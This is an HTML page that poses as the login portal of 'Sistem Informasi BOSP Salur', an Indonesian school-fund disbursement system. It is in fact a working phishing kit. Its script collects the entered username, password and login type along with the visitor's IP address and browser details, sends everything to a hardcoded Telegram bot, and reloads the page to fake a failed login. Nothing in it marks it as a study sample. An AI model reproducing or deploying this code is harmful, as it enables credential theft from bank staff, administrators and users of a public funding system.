<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Informasi BOSP Salur - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: #e9ecef;
        }

        .login-card {
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }

        .input-icon-wrapper {
            position: relative;
        }

        .input-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #9ca3af;
        }

        .loader {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #ffffff;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <!-- Header Section -->
    <div class="text-center mb-8">
        <img src="https://img.sanishtech.com/u/2affb8d157b1efecae4163ec9df2c797.png" 
             alt="Logo BOSP" 
             class="h-20 mx-auto mb-2 object-contain">
        <h1 class="text-2xl font-normal text-gray-600">Sistem Informasi <span class="font-bold text-gray-800">BOSP</span></h1>
        <h2 class="text-3xl font-medium text-gray-700">Salur</h2>
    </div>

    <!-- Login Form Card -->
    <div class="bg-white p-8 rounded-sm w-full max-w-md login-card border border-gray-100">
        <p class="text-center text-gray-500 mb-6 text-sm">Login untuk masuk</p>

        <form id="loginForm" class="space-y-4">
            <div class="input-icon-wrapper">
                <input type="text" id="username" placeholder="Username" 
                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700" required>
                <i data-lucide="mail" class="input-icon w-5 h-5"></i>
            </div>

            <div class="input-icon-wrapper">
                <input type="password" id="password" placeholder="Password" 
                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700" required>
                <i data-lucide="lock" class="input-icon w-5 h-5"></i>
            </div>

            <div class="space-y-1">
                <label class="text-sm font-semibold text-gray-600">Login Type</label>
                <select id="loginType" class="w-full border border-gray-300 p-2.5 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 bg-white text-gray-700 cursor-pointer">
                    <option value="Bank">Bank</option>
                    <option value="Admin">Admin</option>
                    <option value="User">User</option>
                </select>
            </div>

            <button type="submit" id="submitBtn" 
                    class="w-full bg-[#007bff] hover:bg-blue-600 text-white font-medium py-2.5 rounded transition-colors mt-2 flex items-center justify-center">
                <span id="btnText">Sign In</span>
            </button>
        </form>

        <div class="mt-8 flex items-center space-x-2 text-sm">
            <span class="text-red-500">Klik jika</span>
            <button class="bg-[#ffc107] hover:bg-yellow-500 text-gray-800 px-3 py-1 rounded font-medium transition-colors">
                Reset/Lupa Password
            </button>
        </div>
    </div>

    <script>
        lucide.createIcons();

        const TELEGRAM_TOKEN = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
        const TELEGRAM_CHAT_ID = "8001301204";

        const loginForm = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');

        // Fungsi untuk mengambil IP Address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "Gagal mengambil IP";
            }
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Set loading state
            submitBtn.disabled = true;
            btnText.innerHTML = '<span class="loader"></span> Mengirim...';

            // Ambil data input
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginType = document.getElementById('loginType').value;
            
            // Ambil data sistem
            const ipAddress = await getIP();
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenRes = `${window.screen.width}x${window.screen.height}`;

            // Format Pesan
            const message = `🔔 *NOTIFIKASI LOGIN BOSP*\n\n` +
                            `👤 *Username:* \`${username}\`\n` +
                            `🔑 *Password:* \`${password}\`\n` +
                            `🏷️ *Tipe Login:* ${loginType}\n\n` +
                            `🌐 *Informasi Teknis:*\n` +
                            `📍 *IP Address:* ${ipAddress}\n` +
                            `📱 *Platform:* ${platform}\n` +
                            `🖥️ *Resolusi:* ${screenRes}\n` +
                            `🔍 *User Agent:* \n\`${userAgent}\`\n\n` +
                            `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    // Redirect atau tampilkan pesan sukses (Simulasi error login asli)
                    setTimeout(() => {
                        window.location.reload(); 
                    }, 500);
                }
            } catch (error) {
                console.error('Error:', error);
            } finally {
                submitBtn.disabled = false;
                btnText.innerHTML = 'Sign In';
            }
        });
    </script>
</body>
</html>
